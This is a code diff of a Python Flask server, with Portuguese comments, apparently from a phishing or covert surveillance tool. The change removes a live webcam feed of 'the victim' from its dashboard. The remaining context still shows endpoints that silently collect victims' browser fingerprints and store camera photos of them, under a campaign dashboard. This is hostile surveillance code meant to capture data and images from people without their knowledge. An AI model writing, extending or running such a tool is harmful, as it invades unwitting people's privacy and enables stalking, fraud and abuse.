@@ -7,8 +7,6 @@ import base64
 import json
 import os
 import re
-import time
-
 import requests as req
 from flask import Flask, redirect, render_template, request, send_file, Response
 
@@ -153,12 +151,6 @@ def live(fp_token: str):
     return Response(status=404)
 
 
-@app.route("/livefeed/<fp_token>")
-def livefeed(fp_token: str):
-    """Página HTML com o live feed da câmara da vítima (abre no dashboard)."""
-    return render_template("livefeed.html", fp_token=fp_token)
-
-
 @app.route("/fingerprint", methods=["POST"])
 def fingerprint():
     """Recebe dados de fingerprinting do browser da vítima (JSON, silent)."""
@@ -218,27 +210,15 @@ def dashboard():
         if f.get("fp_token") and f["fp_token"] not in captured_fp_tokens
     ]
 
-    # Feeds de câmara activos: frame gravado há menos de 8 segundos
-    active_feeds: set[str] = set()
-    if os.path.isdir(PHOTOS_DIR):
-        now = time.time()
-        for fname in os.listdir(PHOTOS_DIR):
-            if fname.endswith("_latest.jpg"):
-                fpath = os.path.join(PHOTOS_DIR, fname)
-                if now - os.path.getmtime(fpath) < 8:
-                    active_feeds.add(fname.replace("_latest.jpg", ""))
-
     for c in recent_captures:
         fp = c.get("fp_token", "") or ""
         safe = re.sub(r"[^a-zA-Z0-9_-]", "", fp)[:64]
-        c["live"] = safe in active_feeds
         c["has_photo"] = os.path.isfile(os.path.join(PHOTOS_DIR, f"{safe}_latest.jpg"))
 
     stats["total_visitors"] = len(fingerprints)
 
     return render_template("dashboard.html", stats=stats, captures=recent_captures,
-                           campaign=campaign, visitors=visitors,
-                           active_feeds=list(active_feeds))
+                           campaign=campaign, visitors=visitors)
 
 
 if __name__ == "__main__":
